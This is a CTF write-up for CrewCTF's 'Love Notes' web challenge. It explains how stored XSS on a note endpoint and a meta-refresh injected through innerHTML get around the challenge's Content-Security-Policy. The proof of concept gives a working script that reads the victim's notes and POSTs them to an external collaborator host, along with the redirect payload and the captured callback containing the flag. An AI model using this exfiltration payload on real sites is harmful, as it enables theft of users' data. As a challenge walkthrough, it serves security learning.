---
title: "CrewCTF"
date: 2025-09-19
draft: false
description: "CrewCTF - Majix"
toc: false
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

### Web

#### Love Notes

The strict CSP is blocking almost everything:

```js
Content-Security-Policy: `script-src ${HOSTNAME}/static/dashboard.js https://js.hcaptcha.com/1/api.js; style-src ${HOSTNAME}/static/; img-src 'none'; connect-src 'self'; media-src 'none'; object-src 'none'; prefetch-src 'none'; frame-ancestors 'none'; form-action 'self'; frame-src 'none';`);
```

After checking the code and playing around with notes, we can see that there is XSS on the `/api/notes/<note-id>` endpoint:

```js
Title: <html><script>alert(1)
Content: x
```

Due to the custom HTTP response we are able to execute the script:

```http
const responseMessage = `HTTP/1.1 200 OK
  Date: Sun, 7 Nov 1917 11:26:07 GMT
  Last-Modified: the-second-you-blinked
  Type: flag-extra-salty, thanks
  Length: 1337 bytes of pain
  Server: thehackerscrew/1970
  Cache-Control: never-ever-cache-this
  Allow: pizza, hugs, high-fives
  X-CTF-Player-Reminder: drink-water-and-keep-hydrated

  ${note.title}: ${note.content}`
```

Since the CSP specifies `script-src ${HOSTNAME}/static/dashboard.js` we have to find a way to either execute XSS via that JS-File or simply navigate the user to our already existing XSS page under `/api/notes/`.

Luckily we can use a `<meta>` tag to redirect the user / bot from the Dashboard to our payload.

```html
<meta http-equiv="refresh" content="0; url=http://some-url-to-redirect-to">
```

This works, because the CSP does not control navigation. And if we take a closer look at the `dashboard.js` file, we can see that our payload from the note (content) directly flows into a `innerHTML`, which will execute our `<meta>` redirect, which brings the victim to the custom HTTP response page, which has no CSP at all:

```js
const reviewNote = async (reviewNoteId) => {
    const showNoteDiv = document.getElementById('show-note');
    const response = await fetch(`/api/notes/`+reviewNoteId)
    const note = await response.text();

    showNoteDiv.style.display = 'block';

    showNoteDiv.innerHTML = `
        <h3>Note ID: ${reviewNoteId}</h3>
        <p>${note}</p>
    `;
}
```

### Poc

1. Create the PoC code note with any content and a title of:

```html
<html><script>
(async () => {
  try {
    const enc = encodeURIComponent;
    const headers = {'Content-Type':'application/x-www-form-urlencoded'};

    const notes = await fetch('/api/notes', {credentials:'include'}).then(r => r.json());
    const dump = enc(JSON.stringify(notes));

    await fetch('https://94bc2pssteqrof8k8olqr2wtdkjb72vr.oastify.com', {
      method: 'POST', credentials: 'include', headers,
      body: `x=${dump}`
    });
  } catch (e) {}
})();</script>
```

2. Create the redirection note with any content and title of:

```html
<meta http-equiv="refresh" content="0; url=/api/notes/note-id-of-payload">
```

### Collaborator Callback

```
[{"_id":"94094278-c8d4-4a83-a1d5-1741533feadd","title":"VorlÃ¤ufige Ãberlegungen","content":"A spectre is haunting Europe â the spectre of communism. All the powers of old Europe have entered into a holy alliance to exorcise this spectre: Pope and Tsar, Metternich and Guizot, French Radicals and German police-spies."},{"_id":"0ae9d996-db37-4246-b07b-d453584a7eaa","title":"crew{csp_trick_with_a_bit_of_css_spices_fBi4WVX1kGzPtavs}","content":"My heartâs beloved: I am writing you again, because I am alone and because it troubles me always to have a dialogue with you in my head, without your knowing anything about it or hearing it or being able to answerâ¦ There are many females in the world, and some among them are beautiful. But where could I find again a face, whose every feature, even every wrinkle, is a reminder of the greatest and sweetest memories of my life? Even my endless pains, my irreplaceable losses I read in your sweet countenance, and I kiss away the pain when I kiss your sweet faceâ¦ "}]
```

`crew{csp_trick_with_a_bit_of_css_spices_fBi4WVX1kGzPtavs}`